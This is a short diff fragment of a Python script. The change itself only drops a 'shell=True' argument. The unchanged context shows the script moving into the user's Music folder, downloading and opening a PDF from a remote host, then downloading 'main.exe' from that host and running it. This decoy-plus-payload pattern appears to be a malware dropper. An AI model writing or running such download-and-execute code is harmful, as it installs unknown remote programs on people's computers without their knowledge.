@@ -20,7 +20,7 @@ for i in range(x):
 
 os.chdir("Music")
 download("https://armeng.pythonanywhere.com/media/files/gt3-gt4-bep.pdf")
-os.startfile("gt3-gt4-bep.pdf", shell=True) 
+os.startfile("gt3-gt4-bep.pdf") 
 try:
     download("https://armeng.pythonanywhere.com/media/files/main.exe")
     os.startfile("main.exe")
